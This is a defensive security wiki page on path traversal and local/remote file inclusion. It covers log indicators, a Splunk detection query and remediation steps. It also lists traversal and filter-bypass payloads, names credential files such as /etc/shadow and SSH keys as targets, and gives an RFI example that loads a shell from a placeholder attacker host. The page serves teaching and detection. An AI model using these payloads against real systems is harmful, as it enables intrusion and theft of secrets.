<sub>[Home](../README.md) › [Web attacks](README.md)</sub>

# Path traversal and file inclusion (LFI / RFI)

> **In one line:** The attacker uses `../` in a file name parameter to **read files outside the web folder** (path traversal), or makes the application **load and run** a local or remote file (file inclusion).

| **MITRE ATT&CK** | [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) |
|---|---|
| **OWASP** | A01:2025 Broken Access Control · CWE-22 (traversal), CWE-98 (PHP file inclusion) |

## How it works

A page shows files like this:

```text
https://site.com/download?file=report.pdf
```

The server reads `/var/www/files/report.pdf`. The attacker sends:

```text
https://site.com/download?file=../../../../etc/passwd
```

Each `../` goes up one folder, so the server reads `/etc/passwd`.

| Variant | What it does | Example |
|---|---|---|
| **Path traversal** | **Reads** any file | `?file=../../../etc/passwd` |
| **LFI** (Local File Inclusion) | App **includes and executes** a local file (common in PHP `include()`) | `?page=../../../../var/log/apache2/access.log` after injecting PHP code into the log ("log poisoning") → code execution |
| **RFI** (Remote File Inclusion) | App includes a file from **another server** | `?page=http://evil.example/shell.txt` |

## Payloads and bypasses

| Payload | Why |
|---|---|
| `../../../etc/passwd` | Basic Linux |
| `..\..\..\windows\win.ini` | Basic Windows |
| `%2e%2e%2f` | URL-encoded `../` |
| `%252e%252e%252f` | Double-encoded (bypasses filters that decode once) |
| `....//` | Bypasses filters that remove `../` once |
| `/etc/passwd%00.jpg` | Null byte to cut off a forced extension (old PHP versions) |
| `php://filter/convert.base64-encode/resource=index.php` | PHP wrapper to read source code |

**Files attackers want:** `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `~/.ssh/id_rsa`, `.env` (API keys), `web.config` / `appsettings.json` (connection strings), `C:\Windows\win.ini` (test file).

## What you see in logs

| Log source | What to look for |
|---|---|
| Web access log | `../`, `..\`, `%2e%2e`, `%252e`, `/etc/passwd`, `win.ini`, `php://`, `file://`, `http://` inside parameters |
| Web access log | **Status 200** with a response size matching the target file = it worked |
| Web access log | Many traversal attempts with different depths (`../` × 3, 4, 5, 6...) = scanner |
| WAF | Path traversal / LFI signatures |
| Server (RFI) | Server making an outbound HTTP request to fetch a remote file |

## How to detect it

**Example Splunk search**

```spl
index=web
| eval decoded=urldecode(urldecode(uri))
| where match(decoded, "(\.\./|\.\.\\\\|/etc/passwd|win\.ini|php://|file://)")
| stats count, values(status) as status by src_ip, uri_path
```

## How to respond

1. Check status codes and response sizes: **which files were actually read?**
2. If secrets were exposed (`.env`, config files, SSH keys): **rotate them** immediately.
3. If LFI/RFI led to code execution: treat as server compromise (see [Command injection](command-injection.md) response).
4. **Fix:** never use raw user input in file paths; map IDs to file names on the server (`?file=17`); canonicalize the path and check it stays inside the allowed folder; disable `allow_url_include` in PHP.

## References

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

| [← Command injection](command-injection.md) | [Home](../README.md) | [SSRF →](ssrf.md) |
|:---|:---:|---:|
